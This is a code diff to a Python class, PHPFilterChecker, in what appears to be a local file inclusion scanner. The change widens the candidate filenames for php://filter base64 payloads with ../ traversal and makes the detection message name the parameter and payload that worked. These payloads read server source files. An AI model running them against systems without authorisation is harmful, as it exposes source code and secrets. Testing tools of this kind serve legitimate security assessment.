@@ -38,11 +38,18 @@ class PHPFilterChecker:
         params = urllib.parse.parse_qs(parsed_url.query)
         file_paths = []
 
-        for i in range(self.depth):
-            encoded_path = urllib.parse.quote('../' * i + filename)
-            file_paths.append(('php://filter/convert.base64-encode/resource=' + encoded_path, re.compile(r'(?:(?:[A-Za-z0-9+\/]{4}){4,}(?:[A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)?)')))
+        url_filename = parsed_url.path.split('/')[-1] if '/' in parsed_url.path else None
+        base_filename = filename.split('.')[0] if '.' in filename else filename
 
-        
+        filenames = [filename, base_filename]
+        if url_filename and url_filename != filename:
+            filenames.extend([url_filename, url_filename.split('.')[0] if '.' in url_filename else url_filename])
+
+        for file in filenames:
+            for i in range(self.depth):
+                encoded_path = urllib.parse.quote('../' * i + file)
+                file_paths.append(('php://filter/convert.base64-encode/resource=' + encoded_path, re.compile(r'(?:(?:[A-Za-z0-9+\/]{4}){4,}(?:[A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)?)')))
+            
         total_operations = len(params.keys()) * len(file_paths)
 
         if not self.silent:
@@ -78,7 +85,7 @@ class PHPFilterChecker:
                         continue  
                 if valid_matches:  
                     if not self.silent:
-                        self.console.print(f'\n[bold red]Possible LFI detected (php_filter: method)[/bold red]', style='bold red')
+                        self.console.print(f"\n[bold red]Possible LFI detected (php_filter: method)[/bold red] in '{param_name}' with '{file_path}'", style='bold red')
                     self.success_depth = i
                     self.base64_content = valid_matches[0]  
                     return True, param_name
